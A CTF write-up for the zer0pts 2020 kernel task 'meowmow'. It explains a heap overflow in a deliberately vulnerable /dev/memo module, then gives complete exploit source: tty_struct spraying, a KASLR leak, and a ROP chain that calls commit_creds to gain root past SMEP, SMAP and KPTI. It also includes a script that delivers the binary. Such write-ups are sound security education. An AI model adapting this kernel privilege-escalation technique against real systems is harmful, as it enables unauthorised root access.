# meowmow - zer0pts CTF 2020 (pwn, 732p, 9 solved)  
## Introduction

meowmow is a pwn task.

An archive containing a kernel, a init ramdisk (`initrd`) and the source code  
for a vulnerable kernel module is provided.

This binary is a Linux kernel module that provides a device : `/dev/memo`.  
This device can be used to store a note that can be retrieved later.

## Analysis

When opening the device, it uses `kmalloc` to allocate a buffer of 0x400
bytes.

Calling `llseek` on the device will set an internal variable to the offset  
requested.

When reading/writing to the device, it will verify that the offset is strictly  
inferior to 0x400, the size of the buffer. If it is, it will read or write at  
`buffer + offset`. It checks that the size is also inferior to 0x400.

It is possible to read and write up to 0x3FF bytes after the buffer by setting  
the offset to 0x3FF and reading or writing with a size of 0x400.

When working on kernel tasks, it is important to retrieve the addresses of
every  
symbols. This can be done by rooting the VM (modifying the `/init` script to
get  
root) and reading the `/proc/kallsyms` file. This file is more accurate when  
kaslr is disabled.

The goal of this task will be to get two allocations next to each other :
first  
the note, then an object that contains function pointers.

When the device is opened, the driver will allocate a slab from the pool
located  
at `0xffffffff82090fd0`. Looking at the cross references of this pool yields a  
bunch of interesting functions that allocates from the same pool.

Among these results is `alloc_tty_struct`. This function is called when  
creating a tty such as a pseudo terminal from `/dev/ptmx`. (it is safe to
assume  
that every linux kernel is compiled with UNIX98 PTY)

The structure allocated by this function contains a pointer to  
`ptm_unix98_lookup` which can be used to defeat the ASLR. This pointer is a  
virtual table. Modifying it will allow an attacker to hijack the control flow
of  
the program.

The kernel has the `SMEP` (no ret2usr) and `SMAP` protections (ROP chain must
be  
in kernel land).

On top of that, it also has the `KPTI` protection... on Intel CPU only : the  
protection is not explicitly enabled. It is activated on processors that are  
vulnerable to the `Meltdown` vulnerability (i.e. Intel processors).

The exploit presented in this writeup is different than the one used during
the  
CTF : it has been written on an AMD CPU, and did not take the `KPTI`
protection  
into account.

As a result, the original has been modified to spawn a new process that would  
read the flag and write it on `/dev/ttyS0`. The author was not satisfied with  
this bodge, and the exploit has been rewritten to return properly to userland.

## Exploitation

The exploitation steps are the following :  
1. spray the `kmalloc-1k` pool to "fill the holes"  
2. allocate a memo followed by a tty structure  
3. leak addresses from the tty structure to defeat ASLR  
4. set-up the ROP chain in the memo and addresses for the stack pivot  
5. overwrite the pointer to `ptm_unix98_lookup`  
6. close the tty to call the ROP chain

The ROP chain is a classic payload : it calls  
`commit_creds(prepare_kernel_cred(NULL))` which gives root privileges to the  
current process.

In order to return cleanly to userland, it jumps in the middle of  
`swapgs_restore_regs_and_return_to_usermode`, which is the function called by  
the kernel to return to userland after a syscall. It will take care of
switching  
the page tables and calling `swapgs` with `iret`.

**Flag**: `zer0pts{h34p_0v3rfl0w_VS_k4slr+sm3p+sm4p+ktp1}`

## Appendices

### main.c

```c  
#include "syscall.h"

#define DEBUG(str) write(2, str, sizeof(str))

char stack[0x400];

unsigned long user_cs, user_ss, user_rflags;

// stolen from vitaly nikolenko's blog post  
static void save_state() {  
       asm(  
       "movq %%cs, %0\n"  
       "movq %%ss, %1\n"  
       "pushfq\n"  
       "popq %2\n"  
       : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");  
}

void shell(void)  
{  
	const char *args[] = {"/bin/sh", 0};  
	const char *envs[] = {0};

	DEBUG("[!] Should be root\n");  
	execve(args[0], args, envs);  
}

void _start(void)  
{  
	char buffer[0x400];  
	char fake[0x400];  
	int fdm, fdp;

	save_state();

	DEBUG("[*] Spraying pool\n");  
	for(int i = 0; i < 0x10; i++)  
		open("/dev/ptmx", O_RDWR);

	DEBUG("[*] Opening objects\n");  
	if(0 > (fdm = open("/dev/memo", O_RDWR))) {  
		DEBUG("[!] Could not open memo\n");  
		exit(1);  
	}

	if(0 > (fdp = open("/dev/ptmx", O_RDWR))) {  
		DEBUG("[!] Could not open ptmx\n");  
		exit(1);  
	}

	DEBUG("[*] Leak memory\n");  
	lseek(fdm, 0x3FF, SEEK_SET);  
	read(fdm, buffer, sizeof(buffer));  
	//write(1, buffer + 1, sizeof(buffer));

	void *pool = ((void**)(buffer + 1))[7] - 0x38 - 0x400;  
	void *base = ((void**)(buffer + 1))[3]; // rodata 0xffffffff81e65900  
	long  offset = (long)base - 0xffffffff81e65900;

	/* ghetto memset */  
	for(int i = 0; i < sizeof(fake); i++)  
		fake[i] = 0;

#define PIVOT  (void*)(0xffffffff815a98f4llu + offset) // push rcx, pop... rsp  
#define POPRSP (void*)(0xffffffff818aaa78llu + offset) // pop rsp  
#define POPRDI (void*)(0xffffffff8195c042llu + offset) // pop rdi  
#define POPRSI (void*)(0xffffffff81962889llu + offset) // pop rsi  
#define POPRDX (void*)(0xffffffff8173208dllu + offset) // pop rdx  
#define POPRCX (void*)(0xffffffff810631d2llu + offset) // pop rcx  
#define MOVRDI (void*)(0xffffffff81019dcbllu + offset) // mov rdi, rax ; rep
movs

#define PKC    (void*)(0xffffffff8107bb50llu + offset) // prepare_kernel_cred  
#define CK     (void*)(0xffffffff8107b8b0llu + offset) // commit_creds  
#define IRET   (void*)(0xffffffff81a00a45llu + offset) // return to user land

#define LOOP   (void*)(0xffffffff81000218llu + offset) // infinite loop  
#define RET    (void*)(0xffffffff8165f10dllu + offset) // ret for bp

	/* offset */  
	int x = 50;

	for(int i = 0; i < x; i++)  
		((void**)fake)[i] = 0xdeadbeef0000;

	/* Prepare the structure with close */  
	((void**)(buffer + 1))[3] = pool;  
	((void**)fake)[4] = PIVOT; // close

	/* second-stage pivot */  
	((void**)(buffer + 1))[0x40 + 1] = POPRSP;  
	((void**)(buffer + 1))[0x40 + 2] = pool + 8 * x;

	/* ROP chain */

	/* get root */  
	((void**)fake)[x++] = POPRDI;  
	((void**)fake)[x++] = 0;

	((void**)fake)[x++] = PKC;

	((void**)fake)[x++] = POPRCX;  
	((void**)fake)[x++] = 0;  
	((void**)fake)[x++] = MOVRDI;

	((void**)fake)[x++] = CK;

	((void**)fake)[x++] = RET; // breakpoint here  
	((void**)fake)[x++] = IRET;  
	((void**)fake)[x++] = 0xDEADBEEF; // rdi  
	((void**)fake)[x++] = 0xCAFEBABE; // discarded

	/* iret: rip, cs, flags, stack, ss */  
	((void**)fake)[x++] = shell;  
	((void**)fake)[x++] = (void*)user_cs; // always 0x33  
	((void**)fake)[x++] = (void*)user_rflags; // 0x200 is good enough  
	((void**)fake)[x++] = (void*)fake; // reuse for stack  
	((void**)fake)[x++] = (void*)user_ss; // always 0x2b

	DEBUG("[+] Upload structure to kernel\n");  
	lseek(fdm, 0, SEEK_SET);  
	write(fdm, fake, 0x3FF);  
	write(fdm, buffer, sizeof(buffer));

	DEBUG("[+] Trigger payload\n");  
	close(fdp);

	exit(0);  
}  
```

### syscall.h

```c  
#define O_RDONLY 00  
#define O_RDWR 02  
#define SEEK_SET 0  
#define SEEK_CUR 1  
#define SEEK_END 2

int  open(char *path, int flags);  
long lseek(int fd, long offset, int whence);  
long read(int fd, char *buffer, unsigned long size);  
long write(int fd, char *buffer, unsigned long size);  
int  close(int fd);  
void exit(int status);

int  socket(int af, int sol, int proto);  
void pause(void);  
int  execve(const char *path, const char** args, const char **envs);  
int  fork();  
//void shell(void);  
void userloop(void);  
```

### syscall.S

```assembler  
.intel_syntax noprefix

#include <sys/syscall.h>

.global open  
.global lseek  
.global read  
.global write  
.global close  
.global exit  
.global socket  
.global pause  
.global execve  
// .global shell  
.global userloop

open:  
	mov rax, SYS_open  
	syscall  
	ret

lseek:  
	mov rax, SYS_lseek  
	syscall  
	ret

read:  
	mov rax, SYS_read  
	syscall  
	ret

write:  
	mov rax, SYS_write  
	syscall  
	ret

close:  
	mov rax, SYS_close  
	syscall  
	ret

exit:  
	mov rax, SYS_exit  
	syscall  
	ret

socket:  
	mov rax, SYS_socket  
	syscall  
	ret

pause:  
	mov rax, SYS_pause  
	syscall  
	ret

execve:  
	mov rax, SYS_execve  
	syscall  
	ret

shell:  
	lea rdi, [rip + sh]  
	xor esi, esi  
	xor edx, edx  
	jmp execve  
sh:  
	.asciz "/bin/sh"

userloop:  
	jmp userloop  
```

### cook.sh

```sh  
#!/bin/sh  
make || exit 1

echo 'echo "#!/bin/sh" > /tmp/x'  
echo 'echo "cat /flag > /dev/ttyS0" >> /tmp/x'  
echo 'chmod +x /tmp/x'

echo 'cd /tmp; base64 -d <<EOF | xz -d > a && chmod +x a && ./a'  
XZ_DEFAULTS= xz -T09 < main | base64  
echo 'EOF'  
```

### gdbinit

```  
b *0xffffffffc0000123 - 0x30  
commands  
	printf "[+] note: %016llx\n", $rax  
end

b *0xffffffff814105f6  
commands  
	printf "[+] tty: %016llx\n", $rax  
end  
```

Original writeup
(https://github.com/TFNS/writeups/blob/master/2020-03-07-zer0ptsCTF/meowmow/README.md).